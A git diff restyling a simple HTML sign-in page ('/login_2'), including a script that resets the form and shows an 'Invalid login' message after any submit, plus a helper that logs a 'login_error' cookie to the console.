@@ -1,47 +1,35 @@
-<!DOCTYPE html>
 <html>
-    <!--  -->
     <head>
-        <meta charset="utf-8">
-        <title>Credentials</title>
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" type="text/css" href="login.css">
+        <title>Sign in</title>
     </head>
-
-    <!--  -->
     <body>
-
-        <!--  Login Section  -->
-        <div class="login">
-            <h1>Login 2</h1>
+        <div class="main">
             
-            <form id="login-form" action="/login_2" method="post" autocomplete="off">
+            <!--  Login form 2 Section  -->
+            <p class="sign" align="center">Sign in</p>
 
-                <input type="text" name="username" placeholder="Username" required="required" autocomplete="off" />
-                
-                <input type="password" name="password" placeholder="Password" required="required" autocomplete="off" />
-                
-                <button type="submit" class="btn btn-primary btn-block btn-large">Login</button>
+            <form id="login-form-2" class="form" action="/login_2" method="post" autocomplete="off">                 
+                <input class="username" type="text" align="center" placeholder="Username" required="required" autocomplete="off" />
+                <input class="password" type="password" align="center" placeholder="Password" required="required" autocomplete="off"/>
+                <button class="submit2" type="submit" align="center">Sign in</button>
             </form>
 
-            <div id="error-message" hidden="True"><h1>Invalid Login</h1></div>
+            <p class="invalid2" hidden="True" align="center">Invalid login</p>
         </div>
 
-
-        <!--  login forum  -->
-        <script type="text/javascript">
-            document.getElementsByTagName('button')[0].onclick = () => {
-                setTimeout(() => {
-                    // Clear the form input values
-                    document.querySelector('form').reset();
-
-                    // Display login failed message
-                    document.getElementById('error-message').hidden = false;
-                }, 1000);
-            };
-        </script>
-
-        <!-- login message -->
+        <!-- login form script -->
         <script>
-            // Function to get the value of a cookie by name
+            document.getElementsByClassName('submit2')[0].onclick = () => {
+                setTimeout(() => {
+                    document.getElementById('login-form-2').reset()
+                    document.getElementsByClassName('invalid2')[0].hidden = false;
+                }, 250);
+            };
+
+            // function to get the value of a cookie by name
             function getCookie(name) {
                 const cookies = document.cookie.split(';');
                 for (const cookie of cookies) {
@@ -53,16 +41,10 @@
                 return null;
             }
 
-            // Check if the login cookie exists
+            // check if the login cookie exists
             const errorMessage = getCookie('login_error');
-            if (errorMessage) {
+            if (errorMessage) 
                 console.log(errorMessage);
-            }
         </script>
-
     </body>
 </html>
-
-
-
-
